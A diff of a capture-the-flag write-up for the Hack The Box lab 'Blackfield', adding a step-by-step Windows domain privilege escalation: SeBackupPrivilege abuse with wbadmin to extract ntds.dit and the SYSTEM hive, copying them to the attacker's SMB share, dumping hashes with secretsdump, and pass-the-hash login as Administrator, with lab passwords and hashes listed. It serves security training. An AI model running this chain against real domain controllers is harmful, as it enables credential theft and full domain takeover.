@@ -356,13 +356,13 @@ SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\svc_bac
 ```
 `svc_backup` works.
 
-We can add this credention to our collection.
+We can add this credential to our collection.
 
 | username | password | hash |
 | --- | --- | --- |
-| support | #00^BlackKnight | |
-| audit2020 | P@ssw0rd! | |
-| svc_backup | | 9658d1d1dcd9250115e2205d9f48400d |
+| support | #00^BlackKnight | --- |
+| audit2020 | P@ssw0rd! | --- |
+| svc_backup | --- | 9658d1d1dcd9250115e2205d9f48400d |
 
 If we test WinRM we get access.
 ```
@@ -385,7 +385,7 @@ DC01
 blackfield\svc_backup
 
 *Evil-WinRM* PS C:\Users\svc_backup\Documents> cat ..\Desktop\user.txt
-3920bb317a0bef51027e2852be64b543
+3920bb317a0b**********
 ```
 Checking `whoami /all` we can see some interesting privileges.
 ```
@@ -439,4 +439,229 @@ Kerberos support for Dynamic Access Control on this device has been disabled.
 
 The privilege `SeBackupPrivilege` and `SeBackupPrivilege` are interesting ones. Searching on the internet we see many articles about exploiting this privilege. This is a good one: [Windows PrivEsc with SeBackupPrivilege](https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960)
 
+Users with these privileges can create backups of sensitive data of the AD and restore them. We can use it to copy critical files of the system to extract users hashes. 
 
+We need to get 2 items:
+- ntds
+- SYSTEM
+
+Becasue the `ntds` file is in use, we need to backup and restore it on a different folder to be able to copy it.
+
+```
+*Evil-WinRM* PS C:\Users\svc_backup\Documents> mkdir C:\Temp
+*Evil-WinRM* PS C:\Users\svc_backup\Documents> cd C:\Temp
+*Evil-WinRM* PS C:\Temp> 
+```
+
+To generate the backup and restore it later, lets use the `wbadmin` tool on Windows.
+
+```
+*Evil-WinRM* PS C:\Temp> wbadmin start backup -quiet -backuptarget:\\DC01\C$\Temp -include:C:\Windows\ntds
+wbadmin 1.0 - Backup command-line tool
+(C) Copyright Microsoft Corporation. All rights reserved.
+
+
+Note: The backed up data cannot be securely protected at this destination.
+Backups stored on a remote shared folder might be accessible by other
+people on the network. You should only save your backups to a location
+where you trust the other users who have access to the location or on a
+network that has additional security precautions in place.
+
+Retrieving volume information...
+This will back up (C:) (Selected Files) to \\DC01\C$\Temp.
+The backup operation to \\DC01\C$\Temp is starting.
+Creating a shadow copy of the volumes specified for backup...
+Please wait while files to backup for volume (C:) are identified.
+This might take several minutes.
+Creating a shadow copy of the volumes specified for backup...
+Please wait while files to backup for volume (C:) are identified.
+This might take several minutes.
+Scanning the file system...
+Please wait while files to backup for volume (C:) are identified.
+This might take several minutes.
+Found (0) files.
+File identification is complete.
+The backup of volume (C:) to \\DC01\C$\Temp is starting...
+The backup of volume (C:) completed successfully.
+Summary of the backup operation:
+------------------
+
+The backup operation successfully completed.
+The backup of volume (C:) completed successfully.
+Log of files successfully backed up:
+C:\Windows\Logs\WindowsServerBackup\Backup-03-10-2022_21-21-54.log
+```
+
+Note that we had to specify the network share `\\DC01\C$\Temp` for the backup destination as the tool does not allow us to save it locally. We tricked it and pointed the destination to a shared folder on the same machine.
+
+Now let list all the backup versions (restauration points) present on the machine.
+
+```
+*Evil-WinRM* PS C:\Temp> wbadmin get versions
+wbadmin 1.0 - Backup command-line tool
+(C) Copyright Microsoft Corporation. All rights reserved.
+
+Backup time: 9/21/2020 4:00 PM
+Backup location: Network Share labeled \\10.10.14.4\blackfieldA
+Version identifier: 09/21/2020-23:00
+Can recover: Volume(s), File(s)
+
+Backup time: 10/3/2022 2:21 PM
+Backup location: Network Share labeled \\DC01\C$\Temp
+Version identifier: 10/03/2022-21:21
+Can recover: Volume(s), File(s)
+```
+
+The second one on the list is the one we have just genereated. This is the one we need to use to restore the file.
+
+```
+*Evil-WinRM* PS C:\Temp> mkdir Restore
+
+*Evil-WinRM* PS C:\Temp> wbadmin start recovery -quiet -version:10/03/2022-21:21 -itemtype:file -items:C:\Windows\ntds\ntds.dit -recoverytarget:C:\Temp\Restore -notrestoreacl
+wbadmin 1.0 - Backup command-line tool
+(C) Copyright Microsoft Corporation. All rights reserved.
+
+Retrieving volume information...
+You have chosen to recover the file(s) C:\Windows\ntds\ntds.dit from the
+backup created on 10/3/2022 2:21 PM to C:\Temp\Restore.
+Preparing to recover files...
+
+Successfully recovered C:\Windows\ntds\ntds.dit to C:\Temp\Restore\.
+The recovery operation completed.
+Summary of the recovery operation:
+--------------------
+
+Recovery of C:\Windows\ntds\ntds.dit to C:\Temp\Restore\ successfully completed.
+Total bytes recovered: 18.00 MB
+Total files recovered: 1
+Total files failed: 0
+
+Log of files successfully recovered:
+C:\Windows\Logs\WindowsServerBackup\FileRestore-03-10-2022_21-30-56.log
+
+*Evil-WinRM* PS C:\Temp> dir Restore
+
+
+    Directory: C:\Temp\Restore
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        10/3/2022   2:22 PM       18874368 ntds.dit
+```
+
+Now lets generate a copy of the SYSTEM registry hive on the same folder.
+
+```
+*Evil-WinRM* PS C:\Temp> reg save hklm\system C:\Temp\Restore\system.hive
+The operation completed successfully.
+```
+
+Now we have all the files we need.
+```
+*Evil-WinRM* PS C:\Temp> cd Restore
+*Evil-WinRM* PS C:\Temp\Restore> dir
+
+
+    Directory: C:\Temp\Restore
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        10/2/2022   6:29 PM       17383424 system.hive
+-a----        10/2/2022   6:27 PM       18874368 ntds.dit
+```
+
+On Kali, lets create a folder and start an SMB server to receive the files.
+```
+$ mkdir backupPriv
+$ cd backupPriv
+$ impacket-smbserver share $(pwd) -smb2support
+```
+
+Back on the target, lets access the share and copy the files over there.
+
+```
+*Evil-WinRM* PS C:\Temp\Restore> net use \\10.10.14.4\share
+The command completed successfully.
+
+*Evil-WinRM* PS C:\Temp\Restore> copy * \\10.10.14.4\share
+*Evil-WinRM* PS C:\Temp\Restore> dir \\10.10.14.4\share
+
+
+    Directory: \\10.10.14.4\share
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        10/2/2022   6:29 PM       17383424 system.hive
+-a----        10/2/2022   6:27 PM       18874368 ntds.dit
+```
+
+With the restored files at hand we can use `secretsdump.py` to list all the domain credentials.
+
+```
+$ /usr/share/doc/python3-impacket/examples/secretsdump.py -system system.hive -ntds ntds.dit LOCAL > credentials.txt
+
+$ cat credentials.txt | grep -i -e 'admin'
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
+Administrator:aes256-cts-hmac-sha1-96:dbd84e6cf174af55675b4927ef9127a12aade143018c78fbbe568d394188f21f
+Administrator:aes128-cts-hmac-sha1-96:8148b9b39b270c22aaa74476c63ef223
+Administrator:des-cbc-md5:5d25a84ac8c229c1
+```
+
+Lets test the `administrator` hash. 
+
+```
+$ evil-winrm -i 10.10.10.192 -u administrator -H 184fb5e5178480be64824d4cd53b99ee
+...
+*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
+blackfield\administrator
+```
+
+It works :-) <br/>
+
+Now we can add the administrator account on our list of credentials.
+
+| username | password | hash |
+| --- | --- | --- |
+| support | #00^BlackKnight | --- |
+| audit2020 | P@ssw0rd! | --- |
+| svc_backup | --- | 9658d1d1dcd9250115e2205d9f48400d |
+| administrator | --- | 184fb5e5178480be64824d4cd53b99ee |
+
+Before we get the root flag, we have one more obstacle.
+
+```
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat notes.txt
+Mates,
+
+After the domain compromise and computer forensic last week, auditors advised us to:
+- change every passwords -- Done.
+- change krbtgt password twice -- Done.
+- disable auditor's account (audit2020) -- KO.
+- use nominative domain admin accounts instead of this one -- KO.
+
+We will probably have to backup & restore things later.
+- Mike.
+
+PS: Because the audit report is sensitive, I have encrypted it on the desktop (root.txt)
+```
+
+It looks like `root.txt` is encrypted.
+
+```
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> cipher /c root.txt
+
+ Listing C:\Users\Administrator\Desktop\
+ New files added to this directory will not be encrypted.
+
+U root.txt
+```
+
+
+
+```
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
+4375a629c7c6**********
+```
